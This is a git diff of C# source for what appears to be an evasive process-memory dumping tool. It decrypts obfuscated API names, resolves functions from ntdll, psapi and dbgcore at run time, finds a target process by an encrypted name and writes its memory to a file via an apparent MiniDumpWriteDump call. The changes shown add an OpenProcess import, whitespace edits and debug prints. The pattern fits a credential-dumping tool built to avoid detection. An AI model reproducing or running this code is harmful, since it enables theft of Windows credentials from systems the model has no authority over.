@@ -14,6 +14,9 @@ namespace CustomD
         static String password = "MSLegitimateStr.";
         static String iv = "MSLegitimateStr.";
 
+        [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
+
+
         // Strings
         static String decryptedDbgcore = DecryptStringFromBytes("BVai7tBW8s6qrhZU05Wxhw==", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
         static String decryptedMDWD = DecryptStringFromBytes("tFP++qWUzC+ytbpdRB43HWOR6V5Vx/24oI3/Hly5zG0=", Encoding.ASCII.GetBytes(password), Encoding.ASCII.GetBytes(iv));
@@ -256,15 +259,13 @@ namespace CustomD
             IntPtr ntdll = helpGetModuleHandle(decryptedNtdll);
             IntPtr psapi = helpGetModuleHandle(decryptedPsapi);
 
-            IntPtr addrGPI = helpGetProcAddress(k32, decryptedGPI);
+            IntPtr addrGPI =   helpGetProcAddress(k32, decryptedGPI);
             IntPtr addrNtGNP = helpGetProcAddress(ntdll, decryptedNtGNP);
-            IntPtr addrGPIF = helpGetProcAddress(psapi, decryptedGPIF);
+            IntPtr addrGPIF =  helpGetProcAddress(psapi, decryptedGPIF);
             
-            GPIDelegate function_GPI = (GPIDelegate)Marshal.GetDelegateForFunctionPointer(addrGPI, typeof(GPIDelegate));
-            GNPDelegate function_GNP = (GNPDelegate)Marshal.GetDelegateForFunctionPointer(addrNtGNP, typeof(GNPDelegate));
+            GPIDelegate function_GPI =   (GPIDelegate)Marshal.GetDelegateForFunctionPointer(addrGPI, typeof(GPIDelegate));
+            GNPDelegate function_GNP =   (GNPDelegate)Marshal.GetDelegateForFunctionPointer(addrNtGNP, typeof(GNPDelegate));
             GPIFDelegate function_GPIF = (GPIFDelegate)Marshal.GetDelegateForFunctionPointer(addrGPIF, typeof(GPIFDelegate));
-
-            Console.WriteLine("2 " + Process.GetCurrentProcess());
 
             IntPtr aux_handle = IntPtr.Zero;
             int MAXIMUM_ALLOWED = 0x02000000;
@@ -319,6 +320,7 @@ namespace CustomD
             IntPtr addrMDWD = helpGetProcAddress(dbgc, decryptedMDWD);
             MDWDDelegate function_MDWD = (MDWDDelegate)Marshal.GetDelegateForFunctionPointer(addrMDWD, typeof(MDWDDelegate));
 
+
             //Get process PID
             int processPID = GetByName(decryptedProcess); // Process.GetProcessesByName(decryptedProcess)[0].Id;
             Console.WriteLine("[+] Process PID: " + processPID);
@@ -340,6 +342,8 @@ namespace CustomD
             // Create output file
             FileStream output_file = new FileStream(filename, FileMode.Create);
 
+            Console.WriteLine("???? " + Process.GetCurrentProcess());
+
             // Create handle to the process
             // We need (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION), we can get the values from https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights
             uint processRights = 0x0010 | 0x0400;
@@ -348,6 +352,10 @@ namespace CustomD
             if (processHandle != INVALID_HANDLE_VALUE)
             {
                 Console.WriteLine("[+] Handle to process created correctly.");
+
+                Console.WriteLine("processHandle: {0}", processHandle);
+                Console.WriteLine("processPID: {0}", processPID);
+
                 // Read the process            
                 bool isRead = function_MDWD(processHandle, processPID, output_file.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
                 if (isRead)
